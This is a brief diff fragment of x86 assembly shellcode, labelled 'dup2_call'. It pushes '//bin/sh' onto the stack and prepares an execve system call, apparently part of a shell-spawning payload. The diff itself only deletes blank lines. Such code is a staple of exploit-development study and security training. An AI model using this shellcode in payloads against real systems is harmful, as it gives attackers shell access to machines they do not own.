@@ -88,10 +88,8 @@ dup2_call:
 	;syscall 11
 	xor eax, eax
         push eax
-
         push 0x68732f6e
         push 0x69622f2f
-
         mov ebx, esp
 	push eax
 	mov ecx, esp
